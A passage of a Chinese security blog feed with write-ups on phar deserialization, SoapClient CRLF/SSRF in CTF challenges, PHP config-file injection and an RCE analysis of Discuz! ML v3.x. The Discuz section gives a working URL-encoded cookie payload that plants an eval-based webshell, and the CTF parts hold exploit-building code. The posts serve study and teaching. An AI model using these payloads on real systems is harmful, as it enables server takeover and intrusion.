class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'__HALT_COMPILER();'</span>);  <span class="comment">// 并不需要加 <span class="meta">&lt;?</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=xxx&amp;port=xx&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'1'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>另外还有一些例题，比如：</p><ul><li><p>2018 N1CTF Easy&amp;&amp;Hard PHP</p></li><li><p>2019 De1taCTF shellshellshell</p></li></ul><p>简单小结一下，这些题的情景大都是这样：</p><p>最终目标都受到了 IP 的限制，往往需要打出 SSRF，但并没有找到明显的 SSRF 点，只有一个反序列化的，此时该如何利用呢？</p><p>都指向了原生类——SOAPClient，有了两个 CRLF 的助攻，打出去的 POST 报文几乎完全可控。</p><p>这样的 SOAP，你喜欢吗 ：）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://pupiles.com/lctf2018.html" target="_blank" rel="noopener">http://pupiles.com/lctf2018.html</a></p><p><a href="https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/" target="_blank" rel="noopener">https://blog.wonderkun.cc/2018/03/13/n1ctf-hard-php-writeup/</a></p><p><a href="https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/" target="_blank" rel="noopener">https://www.kingkk.com/2018/11/2018-lctf-web-学习篇/</a></p><p><a href="https://www.anquanke.com/post/id/164569" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164569</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SOAP-简介&quot;&gt;&lt;a href=&quot;#SOAP-简介&quot; class=&quot;headerlink&quot; title=&quot;SOAP 简介&quot;&gt;&lt;/a&gt;SOAP 简介&lt;/h2&gt;&lt;p&gt;SOAP（Simple Object Access Protocol）是一种在 web servic
      
    
    </summary>
    
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
      <category term="SSRF" scheme="https://wywwzjj.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>Discuz ML! V3.X RCE 分析</title>
    <link href="https://wywwzjj.top/2019/07/18/Discuz%20ML!%20V3.X%20RCE%20%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/07/18/Discuz ML! V3.X RCE 分析/</id>
    <published>2019-07-18T15:34:37.000Z</published>
    <updated>2019-08-01T03:27:43.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联网社区。该引擎基于 Comsenz Inc. 创建的着名的 Discuz！X 引擎开发。</p><p>但是，这与常见的 Discuz 论坛还是没多大关系。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>Discuz! ML v.3.4</p><p>Discuz! ML v.3.3</p><p>Discuz! ML v.3.2</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>简单来说，没有经过任何处理的 cookie 直接被拼接进模板，该模板被 include 后自然就执行了。</p><p>（不愧是官方的 Demo）</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58e9notqaj216u07wwfy.jpg" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主入口是 upload 目录下的 index.php，没有任何参数的情况下直接载入 forum.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58ftdlnenj20kp01y3yi.jpg" alt></p><p>紧接着 forum.php 又加载了两个核心文件，好戏就要开始了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gas4s7mj20ea026weg.jpg" alt></p><p>class_core.php 中的 39 行 <code>createapp()</code> 开始实例化一个超级对象，再跟一下构造函数</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gezo0iij20fn05r0t1.jpg" alt></p><p>环境变量一些初始化以及输入输出的处理全是在这里完成的，焦点锁定到 <code>_init_input()</code> </p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gki346wj20kz03owes.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58gpf4h2kj20gt0200sr.jpg" alt></p><p>找找这个可控点被用在什么地方</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g58grpn35oj20uq0jfq50.jpg" alt></p><p>其他地方都是包含，这里有个缓存文件，先不管，继续跟，发现开始加载 forum_index.php</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8i1nm7dj20ib01y3yg.jpg" alt></p><p>form_index.php 的 433 行开始加载模板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:forum/discuz:'</span>.$gid);</span><br></pre></td></tr></table></figure><p>之前的那个可控点在这里出现了</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8lkglfpj213c00wt8t.jpg" alt></p><p>紧接着被传入了这个函数之中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh($tplfile, $tplfile, @filemtime(DISCUZ_ROOT . $cachefile), $templateid, $cachefile, $tpldir, $file);</span><br></pre></td></tr></table></figure><p>继续跟，在 function_core.php 中的第 523 行 <code>cachefile</code> 被传入进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$template-&gt;parse_template($maintpl, $templateid, $tpldir, $file, $cachefile);</span><br></pre></td></tr></table></figure><p>在 class_template.php 中，读取了一下原有的模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dm9l9v9uj20ti02ijrz.jpg" alt></p><p>接着用正则进行替换</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmbin23bj212r0alaem.jpg" alt></p><p>末尾将写入文件</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmmlm5z6j20i502gjrg.jpg" alt></p><p>接下来到了激动人心的时刻，这里将拼接我们的恶意语句进入模板</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5a8t4mytgj212d04fwfb.jpg" alt></p><p>但是第一次并不会直接拼接，因为这时候的子模板并没生成，这里先留个印象。</p><p><code>template()</code>将返回一个绝对路径，然后被包含，这时候会执行之前生成的模板，这里继续加载模板。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmgzw8lxj21ar0i20wh.jpg" alt></p><p>直到这一次加载，恶意语句才真正写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$headeradd = <span class="string">"</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_common.htm', 1564153001, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/header_qmenu.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">|| checktplrefresh('./template/default/common/header.htm', './template/default/common/pubsearchform.htm', 1564153002, '', './data/template/en'.phpinfo().'___common_header_forum_index.tpl.php', './template/default', 'common/header_forum_index')</span></span><br><span class="line"><span class="string">;"</span></span><br></pre></td></tr></table></figure><p>可看到具体的位置</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dmpsp4yej21fc04m3zq.jpg" alt></p><p>简化一下就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checktplrefresh(<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="number">1564153002</span>, <span class="string">''</span>, <span class="string">'3'</span>.phpinfo().<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>)</span><br></pre></td></tr></table></figure><p>自然 <code>phpinfo()</code> 的内容就被拼接到了模板文件中</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dnd8cpnrj20am03mmx3.jpg" alt></p><p>最初生成的文件中还有加载了其他模板，接二连三就生成了好几个文件，最终形成了展示的页面。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>由于 cookie 中不能有大写字母，写 webshell 时自然不能直接写，这里可以使用 URL 编码来解决。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">27.</span>file_put_contents%<span class="number">28</span>%<span class="number">27</span>confi9.php%<span class="number">27</span>%<span class="number">2</span>Curldecode%<span class="number">28</span>%<span class="number">27</span>%<span class="number">253</span>c%<span class="number">253</span>fphp+%<span class="number">2520</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">2524</span>_%<span class="number">2550</span>%<span class="number">254</span>f%<span class="number">2553</span>%<span class="number">2554</span>%<span class="number">255</span>b1%<span class="number">255</span>d%<span class="number">29</span>%<span class="number">253</span>b%<span class="number">253</span>f%<span class="number">253</span>e%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29.</span>%<span class="number">27</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最初的可控变量被拼接到模板中，再加上生成的模板被包含，此时恶意代码就生效了，导致代码注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Discuz！ML 是一个由 CodersClub.org 创建的多语言，集成，功能齐全的开源网络平台，用于构建像 “社交网络” 这样的互联
      
    
    </summary>
    
    
      <category term="漏洞分析" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PHP 写入配置文件经典问题</title>
    <link href="https://wywwzjj.top/2019/07/11/PHP-%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/07/11/PHP-写入配置文件经典问题/</id>
    <published>2019-07-11T01:36:48.000Z</published>
    <updated>2019-08-26T06:14:57.712Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容是对 wonderkun 师傅这篇 <a href="https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文章</a> 的学习。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>); </span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>写入 webshell 需要构造 <code>&#39;</code> 闭合，而 <code>&#39;</code> 直接传入将会被 <code>addslashes</code> 转义，看似安全实则不然。</p><p>未对内容进行处理直接写入是一种极其危险的做法，通过一些小手法就可以为所欲为。</p><h2 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vohoey00j20i202gweg.jpg" alt></p><p>成功写到下一行，但<code>&#39;</code> 还是被转义了，问题不大，再替换下就行。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4voickhwej20hy02gdfr.jpg" alt></p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>正常转义</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofwyyudj20hb021q2v.jpg" alt></p><p>成功逃逸</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofc393wj20hd022q2u.jpg" alt></p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>这思路是真的牛逼，下面的 <code>replacement</code> 就是说第二个参数。</p><blockquote><p><code>replacement</code> 中可以包含后向引用 <em>\n</em> 或 <em>$n</em>，语法上首选后者。 每个 这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是 0-99，<em>\0</em> 和 <em>$0</em> 代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从 1 开始数。</p></blockquote><p>构造一个</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqxix006j20gc025a9z.jpg" alt></p><p>再来一下，使用 <code>$0</code> 或者 <code>\0</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqyanufnj20gb02b0sn.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下内容是对 wonderkun 师傅这篇 &lt;a href=&quot;https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7
      
    
    </summary>
    
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phar 与反序列化学习</title>
    <link href="https://wywwzjj.top/2019/05/18/Phar-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2019/05/18/Phar-与反序列化学习/</id>
    <published>2019-05-18T09:45:39.000Z</published>
    <updated>2019-11-04T02:31:51.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="与普通反序列化利用有什么区别？"><a href="#与普通反序列化利用有什么区别？" class="headerlink" title="与普通反序列化利用有什么区别？"></a>与普通反序列化利用有什么区别？</h3><p>在 PHP 下利用反序列化漏洞的时候，通常走这样的一条路线：</p><p><strong>反序列化点 =&gt; 可利用函数 =&gt; 构造反序列化 POP 链</strong></p><p>但在 2018 年的 Black Hat 上，安全研究员 Sam Thomas 指出了一条新思路：</p><p>在<strong>文件系统函数</strong> （ file_get_contents 、 unlink 等）参数可控的情况下，配合 <strong>phar:// 伪协议</strong> ，可以不依赖反序列化函数 <code>unserialize()</code> 直接进行反序列化的操作。</p><h3 id="phar-是什么？"><a href="#phar-是什么？" class="headerlink" title="phar 是什么？"></a>phar 是什么？</h3><p><a href="https://www.php.net/manual/en/phar.using.intro.php" target="_blank" rel="noopener">官方文档</a> 给出了详细的解释。概括来说，有如下<strong>特点</strong>：</p><ul><li><p>Phar 存档在概念上类似于 Java JAR 存档，但是根据 PHP 应用程序的需求和灵活性进行了定制。</p></li><li><p>Phar 可以把多个文件归档到同一个文件中，不经过解压就能被 PHP 访问并执行。</p></li><li><p>Meta-data can be any PHP variable that can be serialized.</p></li></ul><p>最后一点尤其重要，有序列化就有反序列。</p><blockquote><p>This meta-data is unserialized when a Phar archive is first accessed by any(!) file operation. </p><p>This opens the door to unserialization attacks whenever a file operation occurs on a path whose<br>beginning is controlled by an attacker.</p></blockquote><p>再看一下 phar 的<strong>文件结构</strong>。</p><blockquote><p>The phar file format is literally laid out as stub / manifest / contents / signature, and stores the crucial information of what is included in the phar archive in its <em>manifest</em>.</p></blockquote><p>也就是说分为四个部分：</p><ul><li><p>stub</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure><p>  可以当做一个标志来理解，正如上面写的这样，必须以 <code>_HALT_COMPILER();</code> 结尾。所以在设置 <code>stub</code> 时，也要有 <code>__HALT_COMPILER();</code> ，这里的设置就相当灵活了，你可以随便插数据 。比如：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx;<span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">// 需要提醒的是 &lt;?php ?&gt; 并不是必须的，以 ; 隔开即可，可避开检测 &lt;? 的情况</span></span><br></pre></td></tr></table></figure></li><li><p>manifest</p><p>  phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的 meta-data，这是上述攻击手法最核心的地方。</p><p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1g385zk9pc4j20np0a775m.jpg" alt></p></li><li><p>contents：被压缩文件的内容。</p></li><li><p>signature：签名，放在文件末尾。</p></li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>用个小 Demo 来测试一下反序列化（注意要将 php.ini 中的 phar.readonly 选项设置为 0，否则无法生成）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">"Off"</span>);</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);  <span class="comment">// 后缀名必须为phar，生成后可随意修改</span></span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">"2333;__HALT_COMPILER();"</span>);  <span class="comment">// 设置stub</span></span><br><span class="line">    $p-&gt;setMetadata(<span class="keyword">new</span> Test());  <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);  <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    <span class="comment">// 签名自动计算</span></span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到 meta-data 在 phar 中的存在形式</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386hud6grj20hj070jsn.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dese_phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://test.phar/1'</span>;  <span class="comment">// 这里访问的文件存在与否都不重要</span></span><br><span class="line">    file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>可以看到析构函数被成功调用</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386lyrg9aj20ki036mxg.jpg" alt></p><p>seaii 师傅给出了函数列表</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>这里不得不提 orange 在 hitcon 2017 出的 <code>baby^h-master-php-2017</code>，本题可以通过 <a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">i 春秋平台复现</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">$data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">$hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $avatar;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜测执行 FLAG() 出 flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">. <span class="string">"  global \$FLAG; \$FLAG();"</span></span><br><span class="line">. <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="comment">// 难道要爆破？</span></span><br><span class="line">$_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $SECRET;</span><br><span class="line">$data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line"><span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化点，但无法更改 session 的值</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// vps 准备好 phar 文件</span></span><br><span class="line">$data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line"><span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span 